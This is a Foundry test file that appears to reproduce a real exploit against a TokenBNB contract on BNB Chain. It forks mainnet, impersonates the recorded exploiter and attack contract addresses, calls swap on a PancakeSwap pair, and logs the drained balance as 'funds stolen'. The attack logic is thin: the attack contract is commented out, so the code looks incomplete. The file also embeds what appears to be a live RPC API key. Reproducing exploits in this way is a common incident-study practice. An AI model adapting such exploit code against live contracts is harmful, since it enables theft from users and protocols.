// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {TOKENbnb} from "../src/TokenBNB.sol";

interface IPancakeRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function deposit() external payable;
}

// contract AttackContract {
//     constructor () {}

//     fallback () external payable {}
// }
// contract DeployattackContract {
//     constructor() {}

//     fallback () external payable {}
// }
// contract attackContract {
//     address owner;
//     constructor () {
//         owner = msg.sender;
//     }

//     fallback () external payable {}
// }

contract Exploit is Test {
    address exploiter;
    address attackContract;
    IPancakeRouterV2 routerV2;
    IPancakePair pair1;
    IPancakePair pair2;
    address deployer;
    IERC20 wbnb;
    address tokenBNB;

    function setUp() public {
        string memory rpcUrl = "https://bnb-mainnet.g.alchemy.com/v2/4MEgBHdaMAe3XgjtesjJN-DvjtHNQdzd";
        uint256 id = vm.createFork(rpcUrl, 57744491);

        vm.selectFork(id);

        exploiter = 0x48234fB95D4D3E5a09F3ec4dD57f68281B78C825;

        vm.startPrank(exploiter);
        deployer = 0x1dfFe35Fb021f124f04D1a654236E0879FA0CB81; // 0x1dffe35fb021f124f04d1a654236e0879fa0cb81
        attackContract = 0x81F1acd2DAd2A9FE2D879E723fB80b7aeCDc1337; // 0x81f1acd2dad2a9fe2d879e723fb80b7aecdc1337
        vm.stopPrank();

        // vm.deal(attackContract, 1 ether);

        routerV2 = IPancakeRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair1 = IPancakePair(0x231d9e7181E8479A8B40930961e93E7ed798542C);
        pair2 = IPancakePair(0x7b51150F5A61e97f62447E59C7947660822438ab);
        tokenBNB = 0x664201579057f50D23820d20558f4b61bd80BDda;

        wbnb = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c); // WBNB token address
            // vm.prank(address(deployer));
            // wbnb.approve(address(routerV2), type(uint).max);
    }

    function test_exploit() public {
        vm.deal(attackContract, 1 ether);

        uint256 tBNBstartingBalance = tokenBNB.balance;
        console.log("TokenBNB Starting Balance:", tBNBstartingBalance);

        vm.prank(address(deployer));
        console.log("starting exploit......");
        console.log("exploiter", address(exploiter));
        console.log("deployer", address(deployer));
        console.log("attackContract", address(attackContract));
        console.log("pair one", address(pair1));


        pair1.swap(10e18, 0, address(attackContract), "0x00");

        console.log("exploit finished......");

        uint256 tBNBendingBalance = tokenBNB.balance;
        console.log("TokenBNB Ending Balance:", tBNBendingBalance);

        uint256 fundsStolen = tBNBstartingBalance - tBNBendingBalance;
        console.log("Funds lost by TokenBNB contract:", fundsStolen);
    }
}
